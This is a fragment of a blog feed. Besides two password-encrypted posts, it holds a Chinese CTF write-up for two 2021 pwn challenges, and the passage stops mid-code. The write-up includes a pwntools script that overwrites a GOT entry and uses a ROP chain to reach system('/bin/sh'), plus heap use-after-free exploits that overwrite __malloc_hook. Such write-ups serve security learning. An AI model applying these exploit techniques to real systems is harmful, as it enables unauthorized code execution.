data-hmacdigest="d65326aeb8d81917eb344b1f6c08bb2d1eb0350b4a4bcb62c86fbbdee15bd242">994f9c06d970fb4aead1c76eb2a7916ef4db5aadaf7c5969188681a8504f5f2a2de4a2ba0dd1c0880e04d95b51d64a79647d8fa86b8944be21b4376a3b53b73df4ecb0457163144b9562c912c026d40bde9d779a2f0a4af0714b4a41185fb92a91b411e0c7e7844cfa86f8eb942e1d543325bd8f8d5c1275554f6824e4675dc712dffca79a4fb2017632b9d24f2c26b321855e8c15c923e4cf1036be7a8e0b54fc1b93ff9b023fff6964a5d87833363f0ea65d9e0e1cc02e543d4f68823a0cb7d9a3748efdeba9be2369de526f4430fdfae291ba48c3658e8b7d5c4d561d673510d0aaf09809e3a2ff8d3bcb0d4c98983a8ee0a8eeef9051fe81770a1417b2c94c044a2d8d6a34953cc60bb99f5562a2e60f4d31a1182191609da64a46151fe5a865a9212dc0f42b1513d443c87077b59c0aed963a777eafa157885c2fc6ab6b648e63ad0d3a5e354dd1c9f1ac9eb4f8d08408c83ac92b7e3ed7f965eeb1fb63fcaf26ed9dc56cdb28e4b4957efa9f58703c5175ff11a422a8afa1a2d772fe38e90c4deb4ee33a58de24a7c676c897ed9388f922c14788f12362b2010393d29c4b80b8c5954b2f63450432b2d91638e0f7e1bdfa43d24ada2602afa825ecffcf9f22673d26418f5db438f108a1dab8d6fcf22d909e5bcbad31e3c6cb4fca1e61d179f9e9d21e9693f8c18cbe26162c16b80e401bfae3b19cd29addd296af6c1ab1af7c6d9e83f4091f17f1a394c51a206766e18a0d94f338dfb0aed1921f7396c20158970bc150c972eb47b1641fd0c3971ef916fe527e3ca2f02a8feb9be4037d4a16ce2053241bd0c46dc39a64918fe8e697afe02a05f71a5434fc83fdaa434647e101a3253ef7b29cb2f593e0ef442fd6845dec8ed7a61d15d78c1ac5aa245e6486566cfda0e519a3bd58f0b7f67c7d9eeb2f35f72a4249ee2034155d77f531a0582ab839767dfc57c50e1b031939ecff5e1c9037fed49fb1d9d1965110bd18f441a7a051bc84796ed366b301d34e55f9b54f699fab7be6b23a3eb859249fa1c67cbc8de5ede313de879f14a1e9d4d301651ca859dd7c2f8df327252ed8fb8403bdd114699b168214ccb4413be79c718d5a48d15ec8d9ffa35f15d0710ab935f63aa63e182f8ad4af77bcc3781c8247c4fde304ddb013ec7d1dacffadb1df4022503ef6490beb159833731af98267bee3b21d3e0aee928e1666979aecbbc0fdf85d704e69cc09a6dd7919f8cefc09be9d6b06d1ebb8d73576127f477ead9f2b935163f647db720c8bdd70e38195968c7162392434db53f1708964c0efb55e83e0c547ce25e031be31a3e9eea7ffdbd294a15323827877e08a3f6592ccc1af3603e02cbcc2975411d0a71b984ddcc30b61bf0203c9b3f8a52d5cf3d77a099618a3cd5e002721661c9807ab2f3cffc970d322ca143aa44c19ca7a2ca86485c8f9fd31beca6876c6e7c68110fa6e8b678fc066909a3f3097985ff8ac93dce3f79237c9b724ccec129240919bdcce0deb1b569264d14f4cb9e5201d2276d3ee77768622f8aabfab83eb8a165aebbb9b374889578307789696b0a73f98eeeb68452ff616b253be0208fdc5ee75a8841a3f4a9667da8a8eadecaa43aded5ee3feaf0483b9fa39ac33422842303ebea6cfe468b58f6cc0baf0f89a7165da7588b00ee4e49bc3aa24f8e5430aaf80425891c8a8b97bb48b5449b3eae7de3b80dffc687336b962237c98026044d6fd4d79f9571b63408fe555d374a9ead76838008e8d8b1204a9a8832f7023249d589dbc098aba499fd93e5e6b26b4d0fe0a79d1e613091f68e250ecb57c4d46814308057346c471292bc4477728f4ec7033e92c920e017e2f60069fcbea402e14e81f5c224331fdf8f72338c0edfd284d03a2aab45249117e93ffd723d4b423871ff191a010027c0692020bd49cbd46a9958888c317fd697b29e2348fa579b6512a67a3336f201ecb4bb27aac1dbf153c875d37702c400788a7604f1a4b5caf3f74e6c1eb374c7197e921a32f98807780322ffe8c5c60a680c9ba123112e7f7f793fc05c6ccdc74e9d40f2e44db9c09156165a04dee9fe02d921cb2b490d574e1d412c240e94c2a0d0ad8b19652ae17a9964d985d6615e2af8e0457ff17647b93e14e06c7510a358934eb1f5458b1c1aed1a1b6c369f56e25c6352c898d450ec9c3187c9e18c2aed64a49c48bbcfa5397afe0a86c4b36c63ea465d03793023a23e5f08872ddb5c730aea21de746f9f607367e618f4a2a0c3236429325b34e0ca2ed47c909f9fc6d075d58dc8e2232cf31e9462744099068effd2e60b23462c29a54adcfa1f72498ce38d472608cad3346fb0040e3442e84667cfa0b47eebfc650c624171bd264a37c77dcee43e3d106be33b3d37724b76283dfcefd8d4e9e863ec3f31741f2de186272969175d547d99545a9d026086b2c2a29e5ef3a7e9cfcddc94d4624243c66eaaf41e83405f15482a5c14b3e9ef8c7eb2171ea9758ae2949f36b08278c92d346cdaa40943878d8fb036b27f58d1701de048617585ae440b32a8d1928ef302ba7bf5167d19abdda0213560b2409adce307656991745cbe8df0dd86f919603e097883316145788e1c25b79617c56209d9cfa7a1bae53eeb277663330d0c52d05e99a7491bd9d77a76d64fb79f6909a78a8a30b4718d37d3afa5fad184e4ca755de4dfe176b1e0542703fc15dfa101e65ff16fbc64ed9067fe0b8141f0d89c4932469da2751db22fabbe6d3cc01f4295f0b29514fc2c52718c23aab2a41869b3f21fbab12fc627242254cd1c04c62310f7e6ca71ec829c36e07c62f3a814789688f02d3c030e8f604f7cf6499644823efaf8b9097220d91e6d47ad5354d7b4338bd1fa88f46e3b4948de09143b72563f12bd15e76998dc617bae298e15113c485cdd6f6a762f2100ccc5993641ac9dcb05dd10821aa13331d54138fa3682e9d8a5cd8fdc3504fbf4e700fd834253e87b6675fb551bc1c3cd7717e261b1b5641b38048eb9a78dc979433c25e6cd4213acaff79ee6d8e4c0b249c04d5f3f80ef8bbcc79edf4aa56fd2c1705b437c85bdbb5b14c1e19c843336d106b720945a29a3c1a174ba15705120a5bd3fda70667306cadcf7a548c279181e1aed6a6c6c39f12d0b7b3fce794ceeca7e0e68d8cc94ea4c23b1b7e58005f68de08cbf334e347d834223995dc82943a42121c827d67cef7e347587cd9ef40e63e5821c03c75a44d8b337ebe9c8f043f233e5943687db64dad1505d014705ee07c5367fe15a8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好，这里需要密码。</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="OS" scheme="http://example.com/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.S081+XV6 Note</title>
    <link href="http://example.com/2021/11/27/6.s081/"/>
    <id>http://example.com/2021/11/27/6.s081/</id>
    <published>2021-11-26T16:00:00.000Z</published>
    <updated>2021-12-01T15:10:01.325Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c0eb6c3ee0f5a74a2c71a5cc038306f650a6eddeee8725260a4e01c8da4c1e1c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好，这里需要密码。</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="OS" scheme="http://example.com/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>陇原战疫杯2021部分WP</title>
    <link href="http://example.com/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/"/>
    <id>http://example.com/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/</id>
    <published>2021-11-14T16:00:00.000Z</published>
    <updated>2021-11-16T06:41:50.004Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>都是赛后写的，wtcl。</p><p>还是学到了很多。</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="bbbaby"><a href="#bbbaby" class="headerlink" title="bbbaby"></a>bbbaby</h2><p>思路：</p><ul><li>  有canary，使用sub_40086C覆盖canary为puts绕过</li><li>  之后就是泄露libc，写rop链就好</li></ul><p>先看下保护，只开了canary：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    gwt@ubuntu:~/Desktop$ checksec pwn1 </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/pwn1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400766();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;your choice&quot;</span>);</span><br><span class="line">      v4 = input_fun();</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_40086C(<span class="string">&quot;your choice&quot;</span>, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_4008BB(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_40086C，直接往v0的地方(地址？)写入8字节内容:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_40086C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;address:&quot;</span>);</span><br><span class="line">  v0 = input_fun();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v0, <span class="number">8uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_4008BB:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_4008BB</span><span class="params">(<span class="keyword">void</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">  nbytes = input_fun();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, str, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Low Address |                 |</span><br><span class="line">            +-----------------+</span><br><span class="line">    esp =&gt;  | <span class="built_in">local</span> variables |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |    buf[0-3]     |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |    buf[4-7]     |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |     canary      |</span><br><span class="line">            +-----------------+</span><br><span class="line">    ebp =&gt;  |     old ebp     |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |   <span class="built_in">return</span> addr   |</span><br><span class="line">            +-----------------+</span><br><span class="line">            |      args       |</span><br><span class="line">            +-----------------+</span><br><span class="line">   High Address |                 |</span><br></pre></td></tr></table></figure><p>覆写canary为puts</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x40089f    cdqe   </span><br><span class="line">   0x4008a1    mov    edx, 8</span><br><span class="line">   0x4008a6    mov    rsi, rax</span><br><span class="line">   0x4008a9    mov    edi, 0</span><br><span class="line">   0x4008ae    mov    eax, 0</span><br><span class="line"> ► 0x4008b3    call   <span class="built_in">read</span>@plt &lt;0x400610&gt;</span><br><span class="line">        fd: 0x0</span><br><span class="line">        buf: 0x601020 —▸ 0x400606 (__stack_chk_fail@plt+6) ◂— push   1</span><br><span class="line">        nbytes: 0x8</span><br><span class="line"> </span><br><span class="line">   0x4008b8    nop    </span><br><span class="line">   0x4008b9    leave  </span><br><span class="line">   0x4008ba    ret    </span><br><span class="line"> </span><br><span class="line">   0x4008bb    push   rbp</span><br><span class="line">   0x4008bc    mov    rbp, rsp</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffdb00bc120 ◂— 0x0</span><br><span class="line">01:0008│      0x7ffdb00bc128 ◂— 0x601020226ef100</span><br><span class="line">02:0010│ rbp  0x7ffdb00bc130 —▸ 0x7ffdb00bc260 —▸ 0x4009a0 ◂— push   r15</span><br><span class="line">03:0018│      0x7ffdb00bc138 —▸ 0x400966 ◂— jmp    0x400939</span><br><span class="line">04:0020│      0x7ffdb00bc140 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           4008b3</span><br><span class="line">   f 1           400966</span><br><span class="line">   f 2     7f4c384af840 __libc_start_main+240</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    pwndbg&gt; x/20gx 0x601020</span><br><span class="line">0x601020:0x00000000004005ec0x00007f4c38586350</span><br><span class="line">0x601030:0x00007f4c384af7500x00007f4c384fee80</span><br><span class="line">0x601040:0x00007f4c384c5e900x0000000000400656</span><br><span class="line">0x601050:0x00000000000000000x0000000000000000</span><br><span class="line">0x601060:0x000000deadffffcd0x0000000000000000</span><br><span class="line">0x601070:0x00000000000000000x0000000000000000</span><br><span class="line">0x601080 &lt;stdout&gt;:0x00007f4c388546200x0000000000000000</span><br><span class="line">0x601090 &lt;stdin&gt;:0x00007f4c388538e00x0000000000000000</span><br><span class="line">0x6010a0 &lt;stderr&gt;:0x00007f4c388545400x0000000000000000</span><br><span class="line">0x6010b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">    p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27412)</span></span><br><span class="line">    elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">    context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret=<span class="number">0x0000000000400a03</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x601020</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x110</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x40090b</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    puts=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    success(<span class="string">&#x27;puts:&#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line">    libc_base=puts-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x601020</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;address:\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x110</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4005d9</span>)+p64(pop_rdi_ret)+p64(sh)+p64(system))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice\n&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>64，无壳</p><p>看着比较麻烦，还是菜单的heap题。</p><p>其中的dword_202090为2，但是他并没有对index进行其他的操作，那么一直malloc(0)也是OK的，每次malloc的大小是固定的</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211114224708423.png" alt="image-20211114224708423"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211112092826786.png" alt="image-20211112092826786"></p><p>有两个UAF，一个是edit，一个是delete</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211112093027987.png" alt="image-20211112093027987"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211112093008658.png" alt="image-20211112093008658"></p><ul><li>  add：index必须小于2，且每次malloc为0x60</li><li>  edit+print：存在uaf，并没有对index做检查</li><li>  delete：只free了，并没有置零，存在uaf。</li></ul><p>他在edit的输出的时候，会把其他的东西一并带出来，</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115001921220.png" alt="image-20211115001921220"></p><p>有这么几种解法吧，一个是直接uaf写__malloc_hook，onegadget：(不知道为啥是通不了，有时可以)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x7f1df4510d61</span>+<span class="number">0x7f1df414c000</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0xf1247</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有一种，因为前面已经将flag读进来了，直接泄露：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># alloc</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare for a fake 0x70 chunk</span></span><br><span class="line">edit(<span class="number">1</span>, flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x71</span>]))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># partial overwrite </span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;\xe0&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak flag</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 